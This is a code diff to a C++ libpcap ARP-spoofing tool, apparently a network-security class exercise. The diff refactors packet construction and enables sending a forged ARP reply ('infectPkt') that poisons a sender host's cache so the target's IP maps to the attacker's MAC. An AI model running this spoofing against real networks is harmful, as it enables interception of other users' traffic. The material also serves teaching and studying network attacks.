@@ -38,7 +38,7 @@ struct FlowInfo final {
 	Ip targetIp = Ip(0);
 	Mac senderMac = Mac::nullMac();
 	Mac targetMac = Mac::nullMac();
-	EthArpPacket packet;
+	EthArpPacket infectPkt;
 };
 #pragma pack(pop)
 
@@ -47,9 +47,10 @@ std::map<Ip, Mac> arpTable;
 
 void GetMyInfo(Ip *myIp, Mac *myMac, char* dev);
 Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip);
-void SendArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
+EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
+void SendArpPacket(pcap_t* handle, EthArpPacket packet);
 
-EthArpPacket packet;
+
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -87,7 +88,8 @@ Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
 
 	while(true){
 		// mode : 0 = request, 1 = reply
-		SendArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, Ip);
+		EthArpPacket packet = MakeArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, Ip);
+		SendArpPacket(handle, packet);
 	
 		int res = pcap_next_ex(handle, &header, &replyPacket);
 		if (res == 0) return 0;
@@ -109,7 +111,9 @@ Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
 }
 
 // mode : 0 = request, 1 = reply
-void SendArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
+EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
+	EthArpPacket packet;
+
 	packet.eth_.smac_ = eth_smac;
     packet.eth_.dmac_ = eth_dmac;
     packet.eth_.type_ = htons(EthHdr::Arp);
@@ -127,13 +131,16 @@ void SendArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp
     packet.arp_.sip_ = htonl(arp_sip);
     packet.arp_.tmac_ = arp_tmac;
     packet.arp_.tip_ = htonl(arp_tip);
+	return packet;
+}
 
+
+void SendArpPacket(pcap_t* handle, EthArpPacket packet){
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
 	return;
-
 }
 
 int main(int argc, char* argv[]) {
@@ -154,10 +161,6 @@ int main(int argc, char* argv[]) {
 	printf("[ATTACKER MAC ADDR = %s]\n", std::string(attackerMac).c_str());
 	printf("[ATTACKER IP ADDR = %s]\n", std::string(attackerIp).c_str());
 	// arpTable[attackerIp] = attackerMac;
-	auto ret = arpTable.insert({attackerIp, attackerMac});
-	printf("잘 들어감 ? : %d\n",ret.second);
-	auto ret2 = arpTable.insert({attackerIp, attackerMac});
-	printf("잘 들어감 ? 2 : %d\n",ret2.second);
 
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == nullptr) {
@@ -166,7 +169,6 @@ int main(int argc, char* argv[]) {
 	}
 	
 	for(int i=1;i<argc/2;i++){
-		printf("hello\n");
 		FlowInfo info;
 		info.senderIp = Ip(argv[2*i]);
 		info.targetIp = Ip(argv[2*i+1]);
@@ -183,20 +185,19 @@ int main(int argc, char* argv[]) {
 		// else
 		// 	fprintf(stderr, "couldn't get target mac address (%s)\n",errbuf);
 
-		Mac tmp = Mac::nullMac();
+		// Mac tmp = Mac::nullMac();
 		
-		if(arpTable.insert({info.senderIp, tmp}).second)
-			arpTable.insert({info.senderIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp)});
-		if(arpTable.insert({info.targetIp, tmp}).second)
-			arpTable.insert({info.targetIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp)});
-		
-		printf("dkjaf;ldkjfasdkl;fj\n");
+		// if(arpTable.insert({info.senderIp, tmp}).second)
+		// 	arpTable.insert({info.senderIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp)});
+		// if(arpTable.insert({info.targetIp, tmp}).second)
+		// 	arpTable.insert({info.targetIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp)});
 		
 		// info.senderMac = arpTable[info.senderIp];
 		// info.targetMac = arpTable[info.targetIp];
 
-		info.senderMac = arpTable.find(info.senderIp)->second;
-		info.targetMac = arpTable.find(info.targetIp)->second;
+		info.senderMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
+		info.targetMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);
+
 
 		printf("[SENDER MAC ADDR = %s]\n", std::string(info.senderMac).data());
 		printf("[SENDER IP ADDR = %s]\n", std::string(info.senderIp).data());
@@ -204,7 +205,8 @@ int main(int argc, char* argv[]) {
 		printf("[TARGET MAC ADDR = %s]\n", std::string(info.targetMac).data());
 		printf("[TARGET IP ADDR = %s]\n", std::string(info.targetIp).data());
 		
-		//SendArpPacket(1, handle, attackerMac, senderMac, attackerMac, targetIp, senderMac, senderIp);
+		info.infectPkt = MakeArpPacket(1, handle, attackerMac, info.senderMac, attackerMac, info.targetIp, info.senderMac, info.senderIp);
+		SendArpPacket(handle, info.infectPkt);
 		printf("Success Attack\n");
 	}
 
